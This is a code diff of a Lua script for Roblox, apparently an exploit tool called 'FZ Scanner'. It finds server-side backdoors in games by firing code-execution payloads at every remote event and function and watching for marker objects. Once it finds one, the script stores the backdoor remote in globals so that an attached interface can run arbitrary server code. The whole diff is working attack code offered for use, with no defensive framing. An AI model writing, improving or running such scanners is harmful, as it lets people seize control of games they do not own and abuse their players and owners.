@@ -1,10 +1,10 @@
-local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
-                  'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9'}
+-- Remote scanner core (hosted on GitHub)
 
-_G.backdoors = {}
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
+                  'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+
 _G.backdoor = nil
 _G.backdoorPath = nil
-_G.fireRemote = nil
 
 local function generateName(len)
     local name = ""
@@ -14,7 +14,7 @@ local function generateName(len)
     return name
 end
 
-local function fireRemote(remote, payload)
+_G.fireRemote = function(remote, payload)
     if remote:IsA("RemoteEvent") then
         remote:FireServer(payload)
     elseif remote:IsA("RemoteFunction") then
@@ -28,29 +28,19 @@ end
 
 local function testPayload(remote, code)
     local payloads = {
-        "local i=Instance.new('Folder',workspace)i.Name='"..code.."'",
+        "a=Instance.new('Folder',workspace)a.Name='"..code.."'",
         "Instance.new('StringValue',workspace).Name='"..code.."'",
-        "Instance.new('BoolValue',workspace).Value=true;Instance.new('Folder',workspace).Name='"..code.."'",
+        "Instance.new('IntValue',workspace).Value=math.random(1,999999);Instance.new('Folder',workspace).Name='"..code.."'",
         "game.ReplicatedStorage:FindFirstChild('"..code.."',true)or Instance.new('Folder',workspace).Name='"..code.."'",
-        "local f=Instance.new('Folder')f.Parent=workspace f.Name='"..code.."'",
-        "spawn(function() Instance.new('IntValue',workspace).Name='"..code.."' end)",
     }
-
     for _, payload in ipairs(payloads) do
-        fireRemote(remote, payload)
-        task.wait()
+        _G.fireRemote(remote, payload)
     end
-
-    -- Extra attempts for RemoteFunctions with different argument styles
     if remote:IsA("RemoteFunction") then
         task.spawn(function()
             pcall(function()
-                remote:InvokeServer("execute", payloads[1])
+                remote:InvokeServer("test", payloads[1])
                 remote:InvokeServer("run", payloads[1])
-                remote:InvokeServer("load", payloads[1])
-                remote:InvokeServer(payloads[1])
-                remote:InvokeServer({payloads[1]})
-                remote:InvokeServer("code", payloads[1])
                 remote:InvokeServer("", payloads[1])
             end)
         end)
@@ -58,81 +48,55 @@ local function testPayload(remote, code)
 end
 
 local function scan()
-    _G.backdoors = {}
     local tests = {}
+    local rs = game:GetService("ReplicatedStorage")
 
-    -- Common backdoor names (tested first for speed)
-    local commonNames = {
-        "MainRemote", "Remote", "Execute", "Server", "Backdoor", "lh",
+    local possibleNames = {
+        "lh" .. (game.PlaceId / 6666 * 1337 * game.PlaceId),
+        "MainRemote","Remote","Execute","Server","Backdoor",
         tostring(game.PlaceId * 1337),
-        "lh" .. tostring(game.PlaceId / 6666 * 1337 * game.PlaceId),
-        "RemoteEvent", "Func", "Event",
     }
 
-    for _, name in ipairs(commonNames) do
-        for _, container in ipairs({game.ReplicatedStorage, game:GetService("Lighting"), workspace}) do
-            local remote = container:FindFirstChild(name)
-            if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
-                local code = generateName(math.random(30, 40))
-                testPayload(remote, code)
-                tests[code] = {remote = remote, path = remote:GetFullName()}
-            end
+    for _, name in ipairs(possibleNames) do
+        local remote = rs:FindFirstChild(name) or rs:FindFirstChild(tostring(name))
+        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+            local code = generateName(math.random(15, 25))
+            testPayload(remote, code)
+            tests[code] = {remote = remote, path = remote:GetFullName()}
         end
     end
 
-    -- Scan all remotes
     for _, remote in ipairs(game:GetDescendants()) do
         if not (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then continue end
-
         local fullName = remote:GetFullName()
-        if fullName:find("^RobloxReplicatedStorage") or fullName:find("DefaultChatSystemChatEvents") then continue end
+        if fullName:find("^RobloxReplicatedStorage") then continue end
         if remote.Name == "__FUNCTION" then continue end
-
         local parent = remote.Parent
         local pparent = parent and parent.Parent
-        if pparent and (pparent.Name == "HDAdminClient" or pparent.Name == "Adonis") then continue end
+        if pparent and pparent.Name == "HDAdminClient" then continue end
+        if parent and parent.Name == "DefaultChatSystemChatEvents" then continue end
 
-        local code = generateName(math.random(35, 45))
+        local code = generateName(math.random(15, 30))
         testPayload(remote, code)
         tests[code] = {remote = remote, path = fullName}
     end
 
-    -- Check for markers over time (increased for delayed backdoors)
-    for i = 1, 300 do
+    for _ = 1, 120 do
         for code, info in pairs(tests) do
-            local marker = workspace:FindFirstChild(code)
-            if marker then
-                marker:Destroy()
-                table.insert(_G.backdoors, {remote = info.remote, path = info.path})
+            if workspace:FindFirstChild(code) then
+                local obj = workspace:FindFirstChild(code)
+                if obj then obj:Destroy() end
+                _G.backdoor = info.remote
+                _G.backdoorPath = info.path
+                return true
             end
         end
-        task.wait(0.07)
+        task.wait(0.05)
     end
-
-    -- === CRITICAL FIX: Set the globals your GUI expects ===
-    if #_G.backdoors > 0 then
-        local found = _G.backdoors[1]  -- Use the first detected (usually fastest)
-        _G.backdoor = found.remote
-        _G.backdoorPath = found.path
-
-        _G.fireRemote = function(remote, code)
-            if remote:IsA("RemoteEvent") then
-                remote:FireServer(code)
-            elseif remote:IsA("RemoteFunction") then
-                task.spawn(function()
-                    pcall(function()
-                        remote:InvokeServer(code)
-                    end)
-                end)
-            end
-        end
-
-        print("FZ Scanner: Successfully attached to backdoor at " .. found.path)
-        print("Total backdoors found: " .. #_G.backdoors)
-    else
-        print("FZ Scanner: No backdoor found")
-    end
-    -- === END OF FIX ===
+    return false
 end
 
-task.spawn(scan)
+-- Run the scan immediately when loaded from remote
+task.spawn(function()
+    scan()
+end)
